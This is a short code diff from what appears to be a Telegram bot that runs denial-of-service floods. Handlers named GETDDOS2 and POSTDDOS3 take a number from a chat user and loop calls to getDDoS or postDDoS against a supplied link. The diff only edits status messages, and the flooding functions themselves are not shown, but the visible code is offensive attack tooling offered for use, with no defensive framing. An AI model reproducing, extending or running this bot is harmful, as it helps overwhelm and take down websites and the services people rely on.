@@ -40,11 +40,11 @@ def GETDDOS1(message):
 @client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_GET2_A)
 def GETDDOS2(message):
     if(message.text != "Exit"):
-        client.send_message(message.chat.id, 'DDOS is had begun')
+        client.send_message(message.chat.id, 'DDoS is had begun')
         operations = int(message.text)
         for i in range(operations):
             getDDoS(link[0])
-        client.send_message(message.chat.id, 'DDOS is end, you was redirected to main menu')
+        client.send_message(message.chat.id, 'DDoS is end, you was redirected to main menu')
         set_state(message.chat.id, config.States.S_LOGINED_A)
     else:
         client.send_message(message.chat.id, 'Choose type of DDoS:')
@@ -82,11 +82,11 @@ def POSTDDOS2(message):
 @client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_POST3_A)
 def POSTDDOS3(message):
     if(message.text != "Exit"):
-        client.send_message(message.chat.id, 'DDOS is had begun')
+        client.send_message(message.chat.id, 'DDoS had begun')
         operations = int(message.text)
         for i in range(operations):
             postDDoS(link[0], data[0])
-        client.send_message(message.chat.id, 'DDOS is end, you was redirected to main menu')
+        client.send_message(message.chat.id, 'DDoS is end, you was redirected to main menu')
         set_state(message.chat.id, config.States.S_LOGINED_A)
     else:
         client.send_message(message.chat.id, 'Choose type of DDoS:')
